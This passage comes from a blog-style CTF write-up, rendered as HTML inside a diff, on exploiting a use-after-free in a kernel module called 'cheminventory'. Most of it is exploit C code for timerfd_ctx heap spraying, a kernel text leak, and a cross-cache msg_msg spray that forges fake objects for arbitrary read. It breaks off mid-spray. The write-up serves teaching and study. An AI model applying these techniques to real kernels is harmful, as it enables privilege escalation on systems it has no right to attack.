+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Set up sockets
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Setting up sockets</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_SOCKETS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">socketpair</span>(AF_UNIX, SOCK_STREAM, <span style="color:#ae81ff">0</span>, ss[i]) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] Socket pair&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Set up pipe_buffer stuff
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> pipe_buf_operations <span style="color:#f92672">*</span>ops;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> pipe_buffer <span style="color:#f92672">*</span>pbuf;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Open Cheminventory word device
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Opening Cheminventory device</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ((fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/dev/cheminventory&#34;</span>, O_RDONLY)) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] Failed to open miscdevice&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><h4 id="trigger-cross-cache-and-kernel-text-leak">Trigger, Cross Cache and Kernel Text Leak</h4>
+<p>We know that we have the ability to cause a UAF in a struct chemical object that will be allocated in kmalloc-256. Our handle to this UAF is via the chemical linked list, where a target object is chosen for operations via its index number. Let us first take a look at what possible parts of the chemical struct we can use to help us in our exploit.</p>
+<p><img src="/images/cheminventory/chemical_struct.jpg" alt="struct chemical diagram"></p>
+<p>In order to perform any of the kernel module operations on any object, the object must have a valid idx. I have chosen the timerfd_ctx object as the object that will replace the freed victim object, as timerfd_ctx[0xd8] will be 0 even when the timer is armed. This will allow us to perform a DO_READ on the object to get a kernel text leak. struct timerfd_ctx and other relevant structs are shown below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> timerfd_ctx {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">union</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">struct</span> hrtimer tmr;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">struct</span> alarm alarm;
+</span></span><span style="display:flex;"><span>	} t;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">ktime_t</span> tintv;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">ktime_t</span> moffs;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">wait_queue_head_t</span> wqh;
+</span></span><span style="display:flex;"><span>	u64 ticks;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> clockid;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">short</span> <span style="color:#66d9ef">unsigned</span> expired;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">short</span> <span style="color:#66d9ef">unsigned</span> settime_flags;	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> rcu_head rcu;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> list_head clist;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">spinlock_t</span> cancel_lock;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">bool</span> might_cancel;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> hrtimer {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> timerqueue_node		node;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">ktime_t</span>				_softexpires;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">enum</span> <span style="color:#a6e22e">hrtimer_restart</span>		(<span style="color:#f92672">*</span>function)(<span style="color:#66d9ef">struct</span> hrtimer <span style="color:#f92672">*</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> hrtimer_clock_base	<span style="color:#f92672">*</span>base;
+</span></span><span style="display:flex;"><span>	u8				state;
+</span></span><span style="display:flex;"><span>	u8				is_rel;
+</span></span><span style="display:flex;"><span>	u8				is_soft;
+</span></span><span style="display:flex;"><span>	u8				is_hard;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> timerqueue_node {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> rb_node node;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">ktime_t</span> expires;
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> rb_node {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>  __rb_parent_color;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> rb_node <span style="color:#f92672">*</span>rb_right;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> rb_node <span style="color:#f92672">*</span>rb_left;
+</span></span><span style="display:flex;"><span>} <span style="color:#a6e22e">__attribute__</span>((<span style="color:#a6e22e">aligned</span>(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>))));
+</span></span></code></pre></div><p>After getting a kernel text leak with timerfd_ctx, we will want to free the object, and cross cache so that the slab with the victim object is allocated to the kmalloc-cg-256 cache, which will allow us to replace the victim object with struct msg_msg. struct msg_msg is as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> msg_msg {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> list_head m_list; <span style="color:#75715e">// contains 2 pointers, next and prev
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">long</span> m_type;             <span style="color:#75715e">// message type
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">size_t</span> m_ts;		     <span style="color:#75715e">// message data size
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">struct</span> msg_msgseg <span style="color:#f92672">*</span>next; <span style="color:#75715e">// msg_msgseg contains more data from the same msg_msg if the size is very big
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>security;          <span style="color:#75715e">// selinux security pointer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">/* the actual message follows immediately */</span>
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>Remember how struct chemical allows us to read from both the name array in the struct itself, as well as data in the note_addr pointer? By freeing the timerfd_ctx object over the victim object, and then reclaiming that freed space with msg_msg, we are able to get a kernel heap leak by reading off the struct list_head m_list pointers which would be in the name array of struct chemical. Furthermore, the good thing about struct msg_msg is that we are able to control all the data after the header, allowing us to forge a fake note_addr pointer to wherever we want, giving us more or less an arbitrary read primitive.</p>
+<p>Make sure to check out <a href="https://kaligulaarmblessed.github.io/post/cross-cache-for-lazy-people/">Cross Cache for Lazy People &ndash; The Padding Spray Method</a> before proceeding; we will be using this method to perform a cross cache attack here.</p>
+<p>So, we will be doing the following:</p>
+<ol>
+<li>Spray timerfd_ctx as the padding spray</li>
+<li>Allocate the victim struct chemical object</li>
+<li>Free the victim struct chemical object via the vulnerability in DO_REPLACE</li>
+<li>Spray more timerfd_ctx to reclaim the victim object</li>
+<li>Get a kernel text leak by performing DO_READ</li>
+<li>Free all the timerfd_ctx objects and spray msg_msg to cross cache</li>
+</ol>
+<p><strong>Steps 1-4: Padding spray, allocate/free victim object, timerfd_ctx spray</strong></p>
+<p>We will first spray and arm some timerfd_ctx objects (allocated in kmalloc-256, which is the same cache as struct chemical) as the padding spray:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying padding timerfd</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_PADDING; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        padding[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">timerfd_create</span>(CLOCK_REALTIME, <span style="color:#ae81ff">0</span>); 
+</span></span><span style="display:flex;"><span>        timerValue.it_value.tv_sec <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        timerValue.it_value.tv_nsec <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        timerValue.it_interval.tv_sec <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        timerValue.it_interval.tv_nsec <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">timerfd_settime</span>(padding[i],  <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>timerValue, NULL); 
+</span></span><span style="display:flex;"><span>    }   
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>); 
+</span></span></code></pre></div><p>We then allocate, and free the victim object by triggering the vulnerability:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">create_chem</span>(<span style="color:#ae81ff">0x41414141</span>, <span style="color:#ae81ff">0x42424242</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#e6db74">&#34;Carcinogenic&#34;</span>, <span style="color:#e6db74">&#34;Benzene&#34;</span>); 
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">replace_chem</span>(<span style="color:#ae81ff">44444444</span>, <span style="color:#ae81ff">55555555</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0xffffffffffffffff</span>, <span style="color:#e6db74">&#34;blabla&#34;</span>, <span style="color:#e6db74">&#34;meowmeow&#34;</span>);
+</span></span></code></pre></div><p>We will then reclaim the freed victim object by spraying and arming even more timerfd_ctx objects:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying timerfds</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_TIMERFDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        timerfds[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">timerfd_create</span>(CLOCK_REALTIME, <span style="color:#ae81ff">0</span>); 
+</span></span><span style="display:flex;"><span>        timerValue.it_value.tv_sec <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        timerValue.it_value.tv_nsec <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        timerValue.it_interval.tv_sec <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        timerValue.it_interval.tv_nsec <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">timerfd_settime</span>(timerfds[i],  <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>timerValue, NULL); 
+</span></span><span style="display:flex;"><span>    }   
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>); 
+</span></span></code></pre></div><p><strong>Step 5: Get a kernel text leak</strong></p>
+<p>The armed timerfd_ctx objects look like this in a debugger:</p>
+<p><img src="/images/cheminventory/timerfd_armed.jpg" alt="Timerfds armed"></p>
+<p>As we can see, there is a readable kernel text pointer in the region of the name array, and that timerfd_ctx[0xd8] is 0. We can hence get a leak by performing DO_READ, allowing us to calculate the kernel text base:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">read_chem</span>(<span style="color:#ae81ff">0</span>, buf, buf2); 
+</span></span><span style="display:flex;"><span>    kernel_leak <span style="color:#f92672">=</span> buf2[<span style="color:#ae81ff">5</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Kernel text leak: 0x%llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, kernel_leak);
+</span></span><span style="display:flex;"><span>    kernel_base <span style="color:#f92672">=</span> kernel_leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x285ba0</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x120</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Kernel base: 0x%llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, kernel_base); 
+</span></span></code></pre></div><p><strong>Step 6: Cross cache using msg_msg</strong></p>
+<p>To cross cache, we will free all the timerfd_ctx objects:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Free padding spray timerfd objects
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Freeing padding timerfd spray</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_PADDING; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(padding[i]);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Free timerfd objects
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Freeing timerfd spray</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_TIMERFDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(timerfds[i]);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span></code></pre></div><p>After which, we will spray msg_msg (there are many objects being sprayed here, this will be explained in a bit!):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Cross cache msg_msg spray
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Cross cache msg_msg spray</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_MSQIDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>message, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(message));
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtype <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x41</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtext[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> MSG_TAG;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>message.mtext[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> i;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgsnd</span>(msqid[i], <span style="color:#f92672">&amp;</span>message, <span style="color:#66d9ef">sizeof</span>(message) <span style="color:#f92672">-</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] msg_msg spray failed&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Fake object 1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Fake object 1 msg_msg spray</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_MSQIDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>msg_one, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(msg_one));
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_one.mtype <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x61</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_one.mtext[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> MSG_TAG;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_one.mtext[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> i;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgsnd</span>(msqid[i], <span style="color:#f92672">&amp;</span>msg_one, <span style="color:#66d9ef">sizeof</span>(msg_one) <span style="color:#f92672">-</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] msg_msg spray failed&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Spraying secondary msg_msg 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Secondary msg_msg spray</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_MSQIDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>msg_secondary, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(msg_secondary));
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_secondary.mtype <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x42</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_secondary.mtext[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> MSG_TAG;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_secondary.mtext[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> i;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgsnd</span>(msqid[i], <span style="color:#f92672">&amp;</span>msg_secondary, <span style="color:#66d9ef">sizeof</span>(msg_secondary) <span style="color:#f92672">-</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] msg_msg spray failed&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Fake object 2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Fake object 2 msg_msg spray</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_MSQIDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>msg_two, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(msg_two));
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_two.mtype <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x62</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_two.mtext[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> MSG_TAG;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_two.mtext[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> i;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">msgsnd</span>(msqid[i], <span style="color:#f92672">&amp;</span>msg_two, <span style="color:#66d9ef">sizeof</span>(msg_two) <span style="color:#f92672">-</span> <span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">long</span>), <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;[!] msg_msg spray failed&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">exit</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Fake object 3
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Fake object 3 msg_msg spray</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_MSQIDS; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>msg_three, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(msg_three));
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>msg_three.mtype <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x63</span>;
